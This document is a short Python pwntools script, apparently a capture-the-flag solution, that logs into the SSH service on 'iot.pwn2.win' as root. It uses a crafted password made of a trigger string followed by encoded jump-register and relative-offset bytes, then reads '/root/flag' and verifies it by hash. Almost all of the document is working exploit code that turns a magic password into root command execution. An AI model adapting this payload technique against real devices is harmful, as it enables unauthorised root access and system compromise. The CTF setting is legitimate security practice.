#!/usr/bin/env python3
from pwn import *

jalr = 2
relpc = 46100
target = 'iot.pwn2.win'

assert 0 <= jalr <= 31, 'jalr outside of allowed range'
assert (relpc & 1) == 0, 'LSB of relpc must be zero'

assert -(1 << 35) <= relpc <= (1 << 35) - 1, 'relpc outside of allowed range'
relpc >>= 1                                     # LSB is always zero
relpc = ((1 << 35) + relpc) & ((1 << 35) - 1)   # signed to unsigned

trigger = b'CTF-BR{G1.d%fXN}'

payload = trigger + bytes([
    0x40 | jalr,
    0x40 | ((relpc) & 0x1f),
    0x40 | ((relpc >> 5) & 0x1f),
    0x40 | ((relpc >> 10) & 0x1f),
    0x40 | ((relpc >> 15) & 0x1f),
    0x40 | ((relpc >> 20) & 0x1f),
    0x40 | ((relpc >> 25) & 0x1f),
    0x40 | ((relpc >> 30) & 0x1f),
])


class myssh(ssh):
    """ pwntool's ssh is too intelligent for us, what a shame """

    def process(self, *args, **kwargs):
        pass

    def checksec(self, *args, **kwargs):
        pass


s = myssh(user='root', host=target, port=22, password=payload)
c = s.system('cat /root/flag', tty=False)
flag = c.recvall()
log.info('exit code: %d' % c.wait())
c.close()

assert hashlib.sha256(flag).hexdigest() == '96e907025e3036925635026f239af003d053834c407e426a5b8bf41e1a36a51d'
log.info('flag: %r' % flag)
